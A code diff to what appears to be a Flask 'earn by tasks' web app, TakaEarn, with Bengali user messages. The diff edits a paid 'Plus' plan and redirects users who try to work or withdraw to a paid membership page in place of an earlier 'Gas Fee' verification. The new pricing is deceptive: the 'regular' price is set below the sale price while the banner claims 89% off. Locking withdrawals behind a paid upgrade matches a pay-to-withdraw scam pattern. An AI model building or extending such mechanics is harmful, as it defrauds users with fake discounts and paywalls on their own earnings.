@@ -81,9 +81,9 @@ AD_LINKS = [
 TAKAEARN_PLUS_PLAN = {
     'name': 'TakaEarn Plus',
     'badge_image': 'https://i.ibb.co/wFgYXRZR/file-00000000576c82119efe106b8382b669.png',
-    'regular_price': 400,
+    'regular_price': 45,
     'price': 120,  # 75% OFF
-    'discount_text': '70% ছাড় (৭০% OFF)',
+    'discount_text': '89% ছাড় (89% OFF)',
     'daily_profit': 25,
     'days': 30,
     'min_withdraw': 20,
@@ -346,8 +346,8 @@ def before_request_checks():
                 'fb_task', 'ig_task'
             ]
             if request.endpoint in restricted_pages:
-                flash("⚠️ কাজ করতে বা টাকা তুলতে প্রথমে মেম্বার ভেরিফিকেশন (Gas Fee) সম্পন্ন করুন!", "error")
-                return redirect(url_for('activate_account'))
+                flash("💯 কাজ করতে বা টাকা তুলতে প্রথমে TakaEarn Plus মেম্বারশিপ সক্রিয় করুন!", "error")
+                return redirect(url_for('vip_page'))
                 
 
 
@@ -2253,8 +2253,8 @@ def withdraw():
     # ১. এক্টিভেশন সিকিউরিটি চেক
     if g.settings.get('activation_required'):
         if not g.user.get('is_active') and g.user.get('role') != 'admin':
-            flash("⚠️ টাকা উত্তোলনের জন্য আগে একাউন্ট ভেরিফাই করুন!", "error")
-            return redirect(url_for('activate_account'))
+            flash("টাকা উত্তোলনের জন্য আগে TakaEarn Plus মেম্বারশিপ সক্রিয় করুন!", "error")
+            return redirect(url_for('vip_page'))
 
     # ২. পেমেন্ট মেথড সেটআপ চেক
     if not g.user.get('wallet_number') or not g.user.get('wallet_method'):
